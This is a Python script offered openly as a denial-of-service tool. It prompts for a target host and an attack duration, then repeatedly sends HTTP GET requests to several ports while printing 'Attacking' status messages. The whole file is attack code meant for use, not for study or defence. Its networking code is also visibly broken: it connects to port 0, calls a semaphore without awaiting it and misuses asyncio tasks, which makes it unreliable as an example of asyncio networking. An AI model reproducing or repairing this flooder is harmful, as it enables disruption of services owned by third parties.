import asyncio
import socket
from typing import Dict, Tuple
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class CustomTCPProtocol(asyncio.Protocol):
    def __init__(self):
        self.queues: Dict[Tuple[str, int], asyncio.Queue] = {}
        self.destinations: Dict[Tuple[str, int], Tuple[asyncio.Queue, asyncio.Semaphore]] = {}
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print(f"{bcolors.OKGREEN}Connection established{bcolors.ENDC}")

    def data_received(self, data: bytes) -> None:
        for dest in self.destinations.values():
            dest[0].put_nowait(data)

    def connection_lost(self, exc):
        if exc is not asyncio.CancelledError:
            print(f"{bcolors.FAIL}Connection lost{bcolors.ENDC}")
        for dest in self.destinations.values():
            dest[1].release()
        self.destinations.clear()

    def send_data(self, dest: Tuple[asyncio.Queue, asyncio.Semaphore], data: bytes):
        if not dest[0].empty():
            dest[1].acquire()
            dest[0].put_nowait(data)
            dest[1].release()

    def add_destination(self, dest: Tuple[str, int]):
        if dest not in self.destinations:
            self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())

async def monitor_status(target: str, duration_seconds: int):
    end_time = time.time() + duration_seconds
    while time.time() < end_time:
        print(f"\r{bcolors.OKBLUE}Monitoring status of {target}...{bcolors.ENDC}", end="")
        await asyncio.sleep(5)  # Check every 5 seconds
    print()  # Newline after monitoring

async def attack(target: str, duration_minutes: int) -> None:
    status = {}
    duration_seconds = duration_minutes * 60

    def on_task_complete(f: asyncio.Future) -> None:
        result = f.result() if f.done() else "failed"
        status[result] = status.get(result, 0) + 1

    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_connection(lambda: CustomTCPProtocol(), target, 0)
    
    try:
        ports = [80, 443, 8080, 21, 22]
        for port in ports:
            print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
            protocol.add_destination((target, port))
            transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())

        end_time = loop.time() + duration_seconds
        tasks = []
        while loop.time() < end_time:
            for dest in protocol.destinations.keys():
                task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
                    f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
                task.add_done_callback(on_task_complete)
                tasks.append(task)
            await asyncio.sleep(1)

        await asyncio.gather(*tasks)
        print(f"{bcolors.OKGREEN}Attack completed.{bcolors.ENDC}")
        print(f"{bcolors.WARNING}Status:{bcolors.ENDC} {status}")
    finally:
        transport.close()

if __name__ == "__main__":
    duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
    target = input(f"{bcolors.HEADER}Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): {bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes...{bcolors.ENDC}")

    asyncio.run(asyncio.gather(
        attack(target, duration_minutes),
        monitor_status(target, duration_minutes * 60)
    ))
